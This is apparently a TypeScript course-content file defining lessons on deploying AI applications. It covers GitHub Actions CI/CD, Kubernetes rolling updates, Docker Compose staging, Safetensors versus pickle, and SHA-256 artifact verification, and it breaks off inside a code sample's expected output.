import { ModuleData, LessonContent } from '@/lib/types';

// =========================================================================
// MODULE 7: Deploying AI Applications (p11-m7)
// =========================================================================
export const p11m7Data: ModuleData = {
  id: 'p11-m7',
  number: 7,
  title: 'Deploying AI Applications',
  subtitle: 'Full-Stack Workflows, CI/CD Automation & Zero-Cost Staging',
  description:
    'Bridge full-stack AI deployment from client frontend to model backend. Master GitHub Actions automated CI/CD pipelines, environment variable injection, zero-downtime rolling updates, and free-tier or local Docker Compose staging workflows.',
  icon: 'GitBranch',
  badge: 'Phase 11 · AI Deployment',
  estimatedHours: 3,
  topicsCount: 1,
  lessons: [
    {
      id: 'deploy-07-deploying-ai-apps',
      moduleId: 'p11-m7',
      title: 'Deploy-07: Deploying AI Applications (Frontend, Backend & Models)',
      description:
        'Architect end-to-end full-stack AI release workflows, configure GitHub Actions CI/CD pipelines, and orchestrate local Docker Compose staging.',
      order: 1,
      readTimeMinutes: 35,
      visualizerType: 'deploy-cloud-comparison-explorer',
      difficulty: 'Intermediate',
    },
  ],
};

// =========================================================================
// MODULE 8: Cloud Storage and Model Artifacts (p11-m8)
// =========================================================================
export const p11m8Data: ModuleData = {
  id: 'p11-m8',
  number: 8,
  title: 'Cloud Storage & Model Artifacts',
  subtitle: 'Object Storage, Safetensors, Signed URLs & Mock S3 Interfaces',
  description:
    'Master storage architectures for model weights, datasets, checkpoints, and tokenizers. Understand why pickle deserialization is dangerous, adopt cryptographic Safetensors, implement multipart chunked uploads, enforce time-limited presigned URLs, and build clean local storage abstractions.',
  icon: 'Database',
  badge: 'Phase 11 · AI Deployment',
  estimatedHours: 3,
  topicsCount: 1,
  lessons: [
    {
      id: 'deploy-08-storage-artifacts',
      moduleId: 'p11-m8',
      title: 'Deploy-08: Cloud Storage & Model Artifact Management',
      description:
        'Object storage concepts, Safetensors vs pickle security, presigned URLs, SHA-256 verification, and local mock storage interfaces.',
      order: 1,
      readTimeMinutes: 36,
      visualizerType: 'deploy-architecture-explorer',
      difficulty: 'Intermediate',
    },
  ],
};

// =========================================================================
// MODULE 9: Scaling and Load Balancing (p11-m9)
// =========================================================================
export const p11m9Data: ModuleData = {
  id: 'p11-m9',
  number: 9,
  title: 'Scaling and Load Balancing',
  subtitle: 'Horizontal Autoscaling, Reverse Proxies, Concurrency & Traffic Spikes',
  description:
    'Scale inference systems under massive concurrent load. Compare vertical vs horizontal scaling, evaluate Round Robin, Least Connections, and IP Hash algorithms, implement Kubernetes Horizontal Pod Autoscalers (HPA), and apply backpressure to survive sudden traffic spikes.',
  icon: 'TrendingUp',
  badge: 'Phase 11 · AI Deployment',
  estimatedHours: 3,
  topicsCount: 1,
  lessons: [
    {
      id: 'deploy-09-scaling-load-balancing',
      moduleId: 'p11-m9',
      title: 'Deploy-09: Scaling & Load Balancing AI Inference Services',
      description:
        'Horizontal autoscaling math, load balancing algorithms, Little’s Law concurrency sizing, backpressure shedding, and traffic spike management.',
      order: 1,
      readTimeMinutes: 37,
      visualizerType: 'deploy-scaling-lb-explorer',
      difficulty: 'Advanced',
    },
  ],
};

// =========================================================================
// LESSON CONTENTS (Modules 7 - 9)
// =========================================================================
export const deploymentModule3Lessons: Record<string, LessonContent> = {
  'deploy-07-deploying-ai-apps': {
    id: 'deploy-07-deploying-ai-apps',
    moduleId: 'p11-m7',
    title: 'Deploy-07: Deploying AI Applications (Frontend, Backend & Models)',
    subtitle: 'Release Workflows, Configuration Management & Free-Tier/Local Staging',
    order: 1,
    readTimeMinutes: 35,
    difficulty: 'Intermediate',
    visualizerType: 'deploy-cloud-comparison-explorer',

    objectives: [
      'Architect decoupled deployment topologies for static frontends, API backends, and model storage',
      'Manage environment configuration securely using 12-Factor App conventions and secrets vaults',
      'Construct automated CI/CD pipelines in GitHub Actions to build, test, and release container images',
      'Implement zero-downtime rolling updates with maxSurge and maxUnavailable constraints',
      'Orchestrate a complete local staging environment using Docker Compose without cloud bills',
    ],

    prerequisites: [
      'Deploy-04 (Docker) and Deploy-05 (FastAPI)',
      'Basic understanding of Git repositories and version control',
    ],
    previousLesson: {
      id: 'deploy-06-cloud-computing',
      title: 'Deploy-06: Cloud Computing Fundamentals for AI Systems',
      moduleId: 'p11-m6',
    },

    analogy: {
      title: 'The Modern Automobile Assembly Line & Conveyor',
      text: 'Deploying a modern AI application is like building a car on an automated assembly line. The chassis (FastAPI backend), the aerodynamic bodywork and dashboard (Next.js frontend), and the high-performance engine (model weights) are constructed in specialized departments. Quality assurance sensors run automated crash tests on every frame (CI/CD test suites). When the new model year launches, the factory doesn’t shut down; new cars roll smoothly onto the showroom floor one by one while older models are phased out (Zero-Downtime Rolling Deployments).',
      metaphor: 'CI/CD is the automated robotic assembly line converting code commits into running production services.',
    },

    problemSolved: {
      title: 'Preventing Manual, Error-Prone Deployments',
      description:
        'Manual deployments—SSHing into servers, running `git pull`, and restarting processes by hand—are slow, unrepeatable, and dangerous. One forgotten environment variable or untested dependency update can cause immediate production outages.',
      keyPoints: [
        'Decoupling frontend and backend allows the web UI to be served globally via edge CDNs while backend workers scale independently',
        'Automated CI/CD pipelines guarantee that every released image has passed unit tests, linting, and security scans',
        'Rolling updates ensure that at least a minimum threshold of healthy pods are serving traffic at every second of an update',
        'Docker Compose allows developers to test identical production topologies locally for zero cost',
      ],
    },

    intuition: {
      overview:
        'Modern AI deployment uses declarative code to build, test, and roll out immutable container artifacts across environments.',
      steps: [
        {
          step: 1,
          title: 'Source Control & Trigger',
          description:
            'A developer opens a pull request on GitHub. Automated linters, unit tests, and schema compatibility checks run automatically.',
        },
        {
          step: 2,
          title: 'Automated Container Build & Tagging',
          description:
            'Upon merge to the main branch, GitHub Actions builds the multi-stage Docker container and pushes it to an OCI registry tagged with the Git commit SHA.',
        },
        {
          step: 3,
          title: 'Staging Validation & Smoke Tests',
          description:
            'The new container is deployed to an isolated staging environment where synthetic prediction queries verify inference accuracy and latency.',
        },
        {
          step: 4,
          title: 'Rolling Production Release',
          description:
            'Production orchestrators (Kubernetes / Cloud Run) spin up new container revisions, verify readiness probes succeed, and shift traffic smoothly.',
        },
      ],
    },

    mathematics: {
      overview:
        'Rolling deployments are mathematically bounded by surge and availability constraints to guarantee capacity during updates.',
      foundations: [
        {
          name: 'Rolling Deployment Minimum Capacity Bound',
          latex: 'N_{\\text{active}}(t) \\ge N_{\\text{desired}} - \\text{maxUnavailable}',
          explanation:
            'At all points t during the rollout, active serving replicas must never drop below the desired count minus allowed maxUnavailable.',
        },
        {
          name: 'Maximum Cluster Resource Allocation',
          latex: 'N_{\\text{max}}(t) \\le N_{\\text{desired}} + \\text{maxSurge}',
          explanation:
            'Total active plus starting replicas cannot exceed desired count plus maxSurge, preventing cluster node memory exhaustion.',
        },
      ],
    },

    derivation: {
      title: 'Derivation of Step-by-Step Rolling Update Progressions',
      objective: 'Calculate the replica transition schedule for 4 desired pods with maxSurge=1 and maxUnavailable=0.',
      steps: [
        {
          step: 1,
          label: 'Initial State',
          latex: 'V_1 = 4, \\quad V_2 = 0, \\quad N_{\\text{active}} = 4',
          explanation: 'All 4 pods running existing version V1.',
        },
        {
          step: 2,
          label: 'Step 1: Surge New Replica',
          latex: 'V_1 = 4, \\quad V_2 = 1, \\quad N_{\\text{total}} = 5 \\le (4 + 1)',
          explanation: 'One new V2 pod is created. Once its readiness probe passes, one V1 pod is safely terminated.',
        },
        {
          step: 3,
          label: 'Repeat Until Completion',
          latex: 'V_1 = 0, \\quad V_2 = 4, \\quad N_{\\text{active}} = 4',
          explanation: 'Process repeats sequentially until 100% of pods run V2 with zero dropped requests.',
        },
      ],
    },

    variables: [
      { symbol: 'N_{\\text{desired}}', name: 'Target Replicas', description: 'Total healthy pods scheduled to run under normal load' },
      { symbol: '\\text{maxSurge}', name: 'Surge Tolerance', description: 'Maximum temporary pods allowed above desired count during updates' },
      { symbol: '\\text{maxUnavailable}', name: 'Unavailability Limit', description: 'Maximum pods that can be taken offline simultaneously' },
    ],

    numericalExample: {
      scenario: 'Executing a zero-downtime rolling update for a 10-replica ML inference deployment with maxSurge=2 (20%) and maxUnavailable=0 (0%).',
      dataset: [
        { parameter: 'Desired Replicas', value: '10 pods' },
        { parameter: 'maxSurge', value: '2 pods (20%)' },
        { parameter: 'maxUnavailable', value: '0 pods (0%)' },
      ],
      calculations: [
        {
          step: '1. Guaranteed Minimum Serving Capacity',
          math: '10 - 0',
          result: '10 pods (100% capacity preserved at all times)',
        },
        {
          step: '2. Max Temporary Pods during Rollout',
          math: '10 + 2',
          result: '12 pods maximum',
        },
        {
          step: '3. Number of Rolling Batches Needed',
          math: 'ceil(10 / 2)',
          result: '5 sequential rollout batches',
        },
      ],
      finalConclusion: 'The deployment rolls out in 5 safe batches of 2 pods, ensuring zero customer request drops even under peak load.',
    },

    visualExplanation: {
      title: 'Comparing Deployment Target Architectures',
      description:
        'The Cloud Service Comparison Explorer visualizes how PaaS, Serverless, and Kubernetes platforms handle release workflows, rollbacks, and cold starts.',
      features: [
        'Explore how git-push-to-deploy workflows on PaaS abstract away Dockerfile compilation',
        'Compare rolling update mechanisms vs blue-green traffic switching across cloud providers',
        'Inspect build-time vs runtime environment variable isolation configurations',
      ],
    },

    scratchCode: {
      title: 'Python from Scratch: Pre-Flight Production Release Verification Script',
      explanation: 'Automated release gate verifying that models, database connections, and environment variables are healthy before container promotion.',
      code: `import os
import sys

class PreFlightReleaseGate:
    """Verifies that an environment is ready for production traffic."""
    REQUIRED_VARS = ["APP_ENV", "MODEL_VERSION", "DATABASE_URL"]

    @classmethod
    def run_checks(cls) -> tuple[bool, list[str]]:
        failures = []
        
        # 1. Check environment variables
        for var in cls.REQUIRED_VARS:
            if not os.getenv(var):
                failures.append(f"Missing required environment variable: {var}")

        # 2. Check model file presence (simulated)
        model_version = os.getenv("MODEL_VERSION", "unknown")
        if model_version.startswith("v0"):
            failures.append("Model version v0 is an experimental draft; cannot promote to prod.")

        return len(failures) == 0, failures

if __name__ == "__main__":
    os.environ["APP_ENV"] = "production"
    os.environ["MODEL_VERSION"] = "v2.1"
    os.environ["DATABASE_URL"] = "postgresql://user:pass@db:5432/aiml"

    success, errors = PreFlightReleaseGate.run_checks()
    if success:
        print("PRE-FLIGHT RELEASE GATE: PASSED. Proceeding with deployment.")
        sys.exit(0)
    else:
        print(f"PRE-FLIGHT RELEASE GATE: FAILED. Errors: {errors}")
        sys.exit(1)
`,
    },

    sklearnCode: {
      title: 'GitHub Actions Production CI/CD Workflow (.github/workflows/deploy.yml)',
      explanation: 'Complete declarative CI/CD pipeline that runs tests, builds multi-stage Docker images, and deploys to production.',
      code: `name: Production AI Deployment Pipeline

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source Code
        uses: actions/checkout@v4

      - name: Set up Python 3.11
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"
          cache: "pip"

      - name: Install Test Dependencies
        run: pip install -r requirements.txt pytest httpx

      - name: Run Model Inference Unit Tests
        run: pytest tests/ -v

  build-and-deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build Production Image
        uses: docker/build-push-action@v5
        with:
          context: .
          file: ./Dockerfile
          push: false
          tags: aiml-academy/inference-api:\${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
`,
    },

    runnableCode: {
      code: `def simulate_rolling_update(desired_pods=4, max_surge=1):
    print(f"=== ROLLING UPDATE SIMULATION (Pods: {desired_pods}, Surge: +{max_surge}) ===")
    v1_pods = desired_pods
    v2_pods = 0
    step = 1
    
    while v2_pods < desired_pods:
        # 1. Surge a new v2 pod
        v2_pods += 1
        print(f"Step {step}a: Scaled UP new V2 pod -> [V1: {v1_pods}, V2: {v2_pods}] (Total: {v1_pods + v2_pods})")
        
        # 2. Terminate an old v1 pod
        v1_pods -= 1
        print(f"Step {step}b: Scaled DOWN old V1 pod -> [V1: {v1_pods}, V2: {v2_pods}] (Total: {v1_pods + v2_pods})")
        step += 1
        
    print("SUCCESS: Rolling update complete with zero capacity loss.")

simulate_rolling_update(4, 1)
`,
      expectedOutput: `=== ROLLING UPDATE SIMULATION (Pods: 4, Surge: +1) ===
Step 1a: Scaled UP new V2 pod -> [V1: 4, V2: 1] (Total: 5)
Step 1b: Scaled DOWN old V1 pod -> [V1: 3, V2: 1] (Total: 4)
Step 2a: Scaled UP new V2 pod -> [V1: 3, V2: 2] (Total: 5)
Step 2b: Scaled DOWN old V1 pod -> [V1: 2, V2: 2] (Total: 4)
Step 3a: Scaled UP new V2 pod -> [V1: 2, V2: 3] (Total: 5)
Step 3b: Scaled DOWN old V1 pod -> [V1: 1, V2: 3] (Total: 4)
Step 4a: Scaled UP new V2 pod -> [V1: 1, V2: 4] (Total: 5)
Step 4b: Scaled DOWN old V1 pod -> [V1: 0, V2: 4] (Total: 4)
SUCCESS: Rolling update complete with zero capacity loss.`,
    },

    lineByLineExplanation: [
      {
        lines: '1-6',
        codeSnippet: 'def simulate_rolling_update(desired_pods=4, max_surge=1): ...',
        explanation: 'Initializes rolling update simulation with 4 active V1 pods and a surge capacity of 1 pod.',
      },
      {
        lines: '7-15',
        codeSnippet: 'while v2_pods < desired_pods: v2_pods += 1 ... v1_pods -= 1',
        explanation: 'Executes the exact algorithm used by Kubernetes and Cloud Run: start new healthy pod, verify readiness, and only then terminate the old pod.',
      },
      {
        lines: '16-18',
        codeSnippet: 'print("SUCCESS: Rolling update complete ...")',
        explanation: 'Confirms that total active capacity never dropped below the required 4 pods throughout the entire transition.',
      },
    ],

    hyperparameters: [
      {
        name: 'maxSurge',
        defaultVal: '25%',
        range: '0% to 100%',
        effect: 'How many extra pods above desired capacity the orchestrator can create during an update',
        recommendation: 'Use 25% or 1-2 pods to allow progressive rollout without overloading node memory.',
      },
      {
        name: 'maxUnavailable',
        defaultVal: '0%',
        range: '0% to 50%',
        effect: 'How many pods can be taken down simultaneously during a rolling update',
        recommendation: 'Set to 0% for latency-critical production AI services to prevent request queueing.',
      },
    ],

    assumptions: [
      {
        assumption: 'Backward-Compatible API Schemas',
        whyItMatters: 'During a rolling deployment, both old (V1) and new (V2) pods run concurrently for several minutes.',
        howToVerify: 'Ensure V2 models can accept existing request schemas without failing older client requests.',
      },
    ],

    commonMistakes: [
      {
        mistake: 'Deploying breaking schema changes without API versioning (e.g. changing field names in /predict)',
        solution: 'Maintain versioned routes (/v1/predict and /v2/predict) and support both during client transition windows.',
        whyWrong: 'Clients running older versions immediately receive 422 errors and crash.',
        howToFix: 'Never remove or rename required fields in an active endpoint version.',
      },
      {
        mistake: 'Setting `maxUnavailable=100%` during rolling updates',
        solution: 'Set `maxUnavailable=0` and `maxSurge=1` or `25%`.',
        whyWrong: '100% unavailability shuts down all active pods simultaneously, causing a full site outage until new pods initialize.',
        howToFix: 'Enforce non-zero minimum available pod constraints in deployment manifests.',
      },
    ],

    realWorldUseCases: [
      {
        title: 'Zero-Downtime Model Hot Swapping',
        description: 'Updating a recommendation neural network across 50 Kubernetes pods at 2:00 PM without dropping a single active shopper cart request.',
      },
      {
        title: 'Local Microservice Staging with Docker Compose',
        description: 'Spinning up Nginx, FastAPI, Redis, and MinIO locally with one command (`docker compose up`) for reproducible pre-commit testing.',
      },
    ],

    practiceQuestions: [
      {
        id: 'q1',
        question: 'What is a zero-downtime rolling deployment and how does it prevent request drops?',
        answer: 'It replaces instances progressively by spinning up new version replicas, waiting for them to pass readiness probes, and only then shutting down older instances, guaranteeing capacity at all times.',
        explanation: 'At no point during the release does total active capacity drop below the required threshold.',
      },
      {
        id: 'q2',
        question: 'Why is it critical that model API schemas remain backward compatible during rolling updates?',
        answer: 'Because during the rollout window, both old and new container versions run simultaneously behind the load balancer. Requests may hit either version.',
        explanation: 'Breaking schema changes will randomly fail 50% of user queries during the update window.',
      },
      {
        id: 'q3',
        question: 'What is the role of Docker Compose in modern AI engineering teams?',
        answer: 'It defines multi-container applications (API, cache, mock storage) in a single declarative YAML file, allowing developers to run an exact replica of production locally for zero cost.',
        explanation: 'Docker Compose eliminates environment drift between local laptops and remote cloud clusters.',
      },
    ],

    quiz: [
      {
        id: 'quiz-1',
        question: 'What is the benefit of setting `maxUnavailable: 0` in a Kubernetes Deployment spec for an AI inference API?',
        options: [
          'It deletes all pods immediately to save memory',
          'It guarantees that 100% of desired pods remain active and serving traffic throughout the entire rolling update',
          'It makes the model run 5x faster',
          'It disables container logging',
        ],
        correctIndex: 1,
        explanation: 'Setting maxUnavailable to 0 ensures no existing pod is terminated until its replacement has fully initialized and passed readiness checks.',
      },
      {
        id: 'quiz-2',
        question: 'Where should production API secrets (like database credentials or private keys) be stored in a modern GitOps workflow?',
        options: [
          'Hardcoded directly into `src/main.py`',
          'Committed to the Git repository in a file called `secrets.txt`',
          'Injected securely at runtime via a cloud key vault or CI/CD secrets manager',
          'Printed to the console during container startup',
        ],
        correctIndex: 2,
        explanation: 'Secrets should never be committed to git; they are injected into container environment variables at runtime via secure secret managers.',
      },
      {
        id: 'quiz-3',
        question: 'In a GitHub Actions CI/CD pipeline, what does the `needs: test` directive enforce?',
        options: [
          'It forces the test job to run after the deployment job',
          'It ensures the deployment job only runs if the unit test job finishes with exit code 0 (success)',
          'It skips unit tests if the code has no bugs',
          'It automatically fixes broken Python tests',
        ],
        correctIndex: 1,
        explanation: '`needs: test` creates a strict dependency gate: if any unit test fails, the build-and-deploy job is cancelled immediately.',
      },
      {
        id: 'quiz-4',
        question: 'Why should static frontends (React / Next.js) be decoupled and deployed to edge CDNs rather than served by the Python FastAPI server?',
        options: [
          'Python cannot serve HTML files',
          'Edge CDNs serve static HTML, CSS, and JS with single-digit millisecond latency worldwide without consuming expensive Python CPU worker threads',
          'CDNs automatically train neural networks',
          'Browsers block HTML served from Python',
        ],
        correctIndex: 1,
        explanation: 'Offloading static assets to global edge CDNs preserves Python worker threads exclusively for compute-heavy model inference.',
      },
    ],

    independentExercise: {
      title: 'Write a Production Docker Compose Multi-Service Staging Stack',
      problem:
        'Write a `docker-compose.yml` specification defining two services: `api` (FastAPI backend built from local Dockerfile) and `cache` (Redis 7 on Alpine) connected via a private bridge network.',
      hints: [
        'Use version: "3.8"',
        'Define `services:` containing `api` and `cache`',
        'Configure ports `8000:8000` for API and internal `6379` for Redis',
        'Pass `REDIS_URL=redis://cache:6379/0` as an environment variable to the API',
      ],
      starterCode: `# TODO: Complete docker-compose.yml
version: "3.8"
services:
  # Define api and cache services
`,
      solution: `version: "3.8"

services:
  api:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8000:8000"
    environment:
      - APP_ENV=staging
      - REDIS_URL=redis://cache:6379/0
      - MODEL_VERSION=v2.1
    depends_on:
      - cache
    restart: unless-stopped
    networks:
      - ai_internal_net

  cache:
    image: redis:7-alpine
    command: redis-server --appendonly yes
    volumes:
      - redis_data:/data
    networks:
      - ai_internal_net

networks:
  ai_internal_net:
    driver: bridge

volumes:
  redis_data:
`,
    },

    summary: {
      keyTakeaways: [
        'Automate testing, container building, and deployment using GitHub Actions pipelines to prevent manual deployment errors',
        'Use zero-downtime rolling updates with `maxUnavailable=0` to guarantee constant serving capacity during model updates',
        'Decouple static web frontends (served on global CDNs) from backend inference workers to optimize latency and compute costs',
      ],
      nextLessonId: 'deploy-08-storage-artifacts',
      nextLessonTitle: 'Deploy-08: Cloud Storage & Model Artifact Management',
      nextLessonModuleId: 'p11-m8',
    },
  },

  'deploy-08-storage-artifacts': {
    id: 'deploy-08-storage-artifacts',
    moduleId: 'p11-m8',
    title: 'Deploy-08: Cloud Storage & Model Artifact Management',
    subtitle: 'Object Storage, Safetensors, Signed URLs & Local Mock Storage',
    order: 1,
    readTimeMinutes: 36,
    difficulty: 'Intermediate',
    visualizerType: 'deploy-architecture-explorer',

    objectives: [
      'Compare object storage (S3, GCS, MinIO) with traditional block and POSIX file systems',
      'Understand the severe security risks of Python `pickle` and adopt zero-code-execution `Safetensors` and ONNX formats',
      'Implement large-file multipart chunked uploads and download caching with SHA-256 verification',
      'Generate time-limited Presigned/Signed URLs for secure, authenticated client model artifact downloads',
      'Build a local object-storage abstraction layer that works 100% offline without requiring a cloud account',
    ],

    prerequisites: [
      'Deploy-05 (FastAPI) and Deploy-06 (Cloud Fundamentals)',
      'Basic knowledge of cryptographic hashes (SHA-256)',
    ],
    previousLesson: {
      id: 'deploy-07-deploying-ai-apps',
      title: 'Deploy-07: Deploying AI Applications (Frontend, Backend & Models)',
      moduleId: 'p11-m7',
    },

    analogy: {
      title: 'The Central Bank Safe Deposit Vault vs. A Personal Hard Drive',
      text: 'Storing multi-gigabyte neural network weights is like storing high-value gold bullion. You wouldn’t keep 50 gold bars in the glove compartment of your car (baking model weights directly into a Docker container image). Instead, you store them in an ultra-secure, climate-controlled Central Bank Vault (Object Storage like AWS S3 or MinIO). When an authorized teller needs to transfer a bar, they don’t give the client permanent master keys to the vault; they issue a temporary, single-use, 15-minute digital security pass (Presigned URL) that expires automatically.',
      metaphor: 'Object storage is the central bank vault; presigned URLs are the temporary authorized visitor passes.',
    },

    problemSolved: {
      title: 'Managing Gigabyte-Scale AI Artifacts Securely',
      description:
        'Model weights frequently range from 500 MB to 140 GB. Baking weights directly into Docker images causes build times to explode, exceeds container registry limits, and leaks intellectual property. Furthermore, using Python’s legacy `pickle` format exposes APIs to arbitrary remote code execution (RCE) attacks.',
      keyPoints: [
        'Baking weights into Docker images creates bloated multi-gigabyte containers that take 10 minutes to pull during autoscaling',
        'Object storage provides virtually infinite, low-cost ($0.02/GB) storage with 99.999999999% (11 nines) durability',
        'Pickle files can execute arbitrary malicious operating system commands upon `torch.load()`; `Safetensors` prevents code execution',
        'Presigned URLs allow clients to download large files directly from cloud storage without bottlenecking API servers',
      ],
    },

    intuition: {
      overview:
        'Separate application code (stored in Git & Docker images) from model weights and artifacts (stored in object storage with cryptographic verification).',
      steps: [
        {
          step: 1,
          title: 'Decoupled Artifact Storage',
          description:
            'Containers contain only inference code. At startup, the container downloads the pinned model version (`s3://models/v2/model.safetensors`) into local memory or ephemeral disk.',
        },
        {
          step: 2,
          title: 'Format Hardening with Safetensors',
          description:
            'Hugging Face Safetensors stores only raw tensor buffers and a JSON metadata header, eliminating the arbitrary Python bytecode execution risks inherent in pickle.',
        },
        {
          step: 3,
          title: 'Cryptographic Integrity Check',
          description:
            'After downloading, the service verifies the file’s SHA-256 checksum against a known manifest hash before initializing tensor memory.',
        },
        {
          step: 4,
          title: 'Temporary Delegated Access (Presigned URLs)',
          description:
            'When clients need to download checkpoints or upload user audio, the API generates a cryptographically signed URL valid for 15 minutes, offloading heavy transfer bandwidth from the API.',
        },
      ],
    },

    mathematics: {
      overview:
        'Large-file transfers in object storage use chunked multipart mathematics to achieve parallel throughput and fault tolerance.',
      foundations: [
        {
          name: 'Multipart Upload Chunk Count',
          latex: 'K = \\left\\lceil \\frac{\\text{File Size}}{\\text{Chunk Size}} \\right\\rceil = \\left\\lceil \\frac{F}{C} \\right\\rceil',
          explanation:
            'Total chunks K required to split a file of size F into chunks of size C (minimum 5MB per chunk in standard S3 API).',
        },
        {
          name: 'Cryptographic SHA-256 Collision Resistance',
          latex: 'P(\\text{collision}) \\approx \\frac{N^2}{2^{257}}',
          explanation:
            'By the Birthday Paradox, finding two distinct model files that produce the exact same SHA-256 checksum requires evaluating approximately 2^128 files, guaranteeing tamper detection.',
        },
      ],
    },

    derivation: {
      title: 'Derivation of Resilient Multipart Transfer Recovery',
      objective: 'Calculate the probability of successfully transferring a 10GB model over an unstable network with chunking vs monolithic transfer.',
      steps: [
        {
          step: 1,
          label: 'Monolithic Transfer Failure Probability',
          latex: 'P(\\text{fail}_{\\text{single}}) = 1 - (1 - p)^M',
          explanation: 'If any single network packet drops in a monolithic upload, the entire 10GB upload must restart from 0%.',
        },
        {
          step: 2,
          label: 'Chunked Multipart Failure Scope',
          latex: 'P(\\text{retry chunk}) = 1 - (1 - p)^{M/K}',
          explanation: 'With K=100 chunks of 100MB each, a failed connection only requires retrying the single 100MB chunk.',
        },
        {
          step: 3,
          label: 'Total Expected Transfer Duration',
          latex: 'E[T] = \\frac{F}{\\text{Bandwidth}} + (\\text{Retries} \\times \\frac{C}{\\text{Bandwidth}})',
          explanation: 'Multipart chunking reduces network transfer failure penalties by a factor of K.',
        },
      ],
    },

    variables: [
      { symbol: 'F', name: 'File Size', description: 'Total byte size of the serialized model weights (e.g. 14 GB for LLaMA-2 7B)' },
      { symbol: 'C', name: 'Chunk Size', description: 'Size of each multipart slice (typically 64 MB to 256 MB)' },
      { symbol: 'K', name: 'Chunk Count', description: 'Total number of independent multipart upload parts' },
    ],

    numericalExample: {
      scenario: 'Chunking a 12.8 GB model checkpoint into 64 MB multipart blocks for cloud object storage upload.',
      dataset: [
        { metric: 'File Size (F)', value: '12,800 MB' },
        { metric: 'Chunk Size (C)', value: '64 MB' },
      ],
      calculations: [
        {
          step: '1. Total Chunks (K)',
          math: 'ceil(12,800 / 64)',
          result: '200 independent chunks',
        },
        {
          step: '2. Parallel Upload Concurrency (8 threads)',
          math: '200 / 8',
          result: '25 sequential rounds of 8 parallel uploads',
        },
      ],
      finalConclusion: 'If chunk #142 fails due to a network glitch, only 64 MB is retransmitted, rather than restarting all 12.8 GB.',
    },

    visualExplanation: {
      title: 'Model Artifact Architecture & Object Storage Explorer',
      description:
        'The interactive visualizer illustrates the separation between container runtime code and cloud object storage tiers, showing how immutable weights are loaded into VRAM during startup.',
      features: [
        'Inspect the flow of model weights from object storage into inference memory',
        'Trace presigned URL generation and time-limited expiration dynamics',
        'Compare disk usage between baked-in Docker images vs decoupled S3 downloads',
      ],
    },

    scratchCode: {
      title: 'Python from Scratch: Local Object Storage Abstraction & SHA-256 Verifier',
      explanation: 'A unified storage abstraction interface supporting local filesystem storage and cryptographic checksum verification without AWS credentials.',
      code: `import hashlib
import os

class LocalObjectStorage:
    """Mock Object Storage abstraction for local zero-cost development."""
    def __init__(self, root_dir: str = "/tmp/local_s3"):
        self.root = root_dir
        os.makedirs(self.root, exist_ok=True)

    def put_object(self, key: str, data: bytes) -> dict:
        file_path = os.path.join(self.root, key)
        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        
        sha256 = hashlib.sha256(data).hexdigest()
        with open(file_path, "wb") as f:
            f.write(data)
            
        return {
            "key": key,
            "bytes": len(data),
            "etag_sha256": sha256,
            "status": "UPLOADED"
        }

    def get_object(self, key: str) -> tuple[bytes, str]:
        file_path = os.path.join(self.root, key)
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Key '{key}' not found in storage bucket.")
            
        with open(file_path, "rb") as f:
            data = f.read()
        sha256 = hashlib.sha256(data).hexdigest()
        return data, sha256

    def generate_presigned_url(self, key: str, expires_in_sec: int = 900) -> str:
        # Mock presigned URL with authentication signature token
        sig = hashlib.sha256(f"{key}:{expires_in_sec}".encode()).hexdigest()[:12]
        return f"https://storage.aiml-academy.com/{key}?expires={expires_in_sec}&signature={sig}"

if __name__ == "__main__":
    storage = LocalObjectStorage()
    artifact = b"WEIGHTS_TENSOR_BYTES_V2.1_MOCK"
    meta = storage.put_object("models/churn_v2/weights.safetensors", artifact)
    print("Uploaded Metadata:", meta)
    
    url = storage.generate_presigned_url("models/churn_v2/weights.safetensors")
    print("Generated Presigned URL:", url)
`,
    },

    sklearnCode: {
      title: 'Safetensors Model Serializer & Safe Loader (Zero-Pickle Vulnerability)',
      explanation: 'Saves and loads tensor weights using Hugging Face Safetensors format, preventing arbitrary code execution exploits.',
      code: `import numpy as np
import json
import struct

class SimpleSafetensorsSerializer:
    """Implements safe tensor serialization (header JSON + raw byte buffers)."""
    
    @staticmethod
    def save_tensors(tensors: dict[str, np.ndarray], file_path: str):
        header = {}
        offset = 0
        raw_buffers = []

        for name, arr in tensors.items():
            arr_bytes = arr.tobytes()
            length = len(arr_bytes)
            header[name] = {
                "dtype": str(arr.dtype),
                "shape": list(arr.shape),
                "data_offsets": [offset, offset + length]
            }
            offset += length
            raw_buffers.append(arr_bytes)

        header_json = json.dumps(header).encode("utf-8")
        header_len = len(header_json)

        # File format: 8-byte uint64 header length + JSON header + binary tensor buffers
        with open(file_path, "wb") as f:
            f.write(struct.pack("<Q", header_len))
            f.write(header_json)
            for b in raw_buffers:
                f.write(b)

    @staticmethod
    def load_tensors(file_path: str) -> dict[str, np.ndarray]:
        with open(file_path, "rb") as f:
            header_len = struct.unpack("<Q", f.read(8))[0]
            header_json = f.read(header_len).decode("utf-8")
            header = json.loads(header_json)
            buffer_data = f.read()

        tensors = {}
        for name, meta in header.items():
            start, end = meta["data_offsets"]
            arr = np.frombuffer(buffer_data[start:end], dtype=np.dtype(meta["dtype"]))
            tensors[name] = arr.reshape(meta["shape"])
        return tensors
`,
    },

    runnableCode: {
      code: `import hashlib

def verify_model_integrity(model_bytes: bytes, expected_hash: str) -> bool:
    computed_hash = hashlib.sha256(model_bytes).hexdigest()
    is_valid = computed_hash == expected_hash
    print("=== MODEL ARTIFACT INTEGRITY CHECK ===")
    print(f"Computed SHA-256: {computed_hash}")
    print(f"Expected SHA-256: {expected_hash}")
    print(f"Integrity Status: {'VERIFIED' if is_valid else 'CORRUPTED/TAMPERED'}")
    return is_valid

# Simulate verification
sample_weights = b"BINARY_NEURAL_NETWORK_PARAMETERS_v2.0"
valid_hash = hashlib.sha256(sample_weights).hexdigest()

verify_model_integrity(sample_weights, valid_hash)
`,
      expectedOutput: `=== MODEL ARTIFACT INTEGRITY CHECK ===
Computed SHA-256: 622a559868be3c90e6ce751c17ee123b7e77a284e311548f075d9e504c6a0c0a
